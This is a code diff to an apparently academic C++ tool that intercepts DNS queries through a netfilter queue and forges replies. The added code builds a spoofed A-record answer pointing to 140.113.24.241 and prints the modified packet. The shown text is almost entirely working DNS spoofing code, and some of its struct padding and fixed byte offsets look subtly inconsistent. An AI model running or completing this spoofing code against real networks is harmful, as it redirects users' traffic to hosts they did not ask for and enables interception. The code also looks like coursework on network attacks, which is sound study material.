@@ -52,6 +52,16 @@ struct dnshdr
     uint16_t adcount;
 };
 
+struct answer_section
+{
+    uint16_t name;
+    uint16_t type;
+    uint16_t class_;
+    uint32_t ttl;
+    uint16_t rdlength;
+    // uint32_t rdata;
+};
+
 string gateway_ip;
 string source_ip;
 string interface;
@@ -391,12 +401,33 @@ void send_spoofed_dns_reply(char *packet, int len)
     // derive the question section
     while (*dns_query != 0)
     {
-        printf("%02x ", (unsigned char)*dns_query);
+        // cout << *dns_query; // www nycu edu tw
         dns_query++;
     }
-    cout <<endl;
-    dns_query += 5;
-    // derive the answer section
+    dns_query += 4; 
+    dns_answer = dns_query;
+    struct answer_section *answer = (struct answer_section *)dns_answer;
+    answer->name = htons(0xc00c);
+    answer->type = htons(1);
+    answer->class_ = htons(1);
+    answer->ttl = htonl(5);
+    answer->rdlength = htons(4);
+    dns_answer += sizeof(answer_section);
+    // attach the IP 140.113.24.241 address to the answer section
+    packet[41] = 140;
+    packet[42] = 113;
+    packet[43] = 24;
+    packet[44] = 241;
+    // cout to check the spoofed DNS reply
+    cout << "Spoofed DNS reply: " << endl;
+    for (int i = 0; i < len; ++i)
+    {
+        cout << packet[i];
+    }
+    cout << endl;
+
+
+
 }
 static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
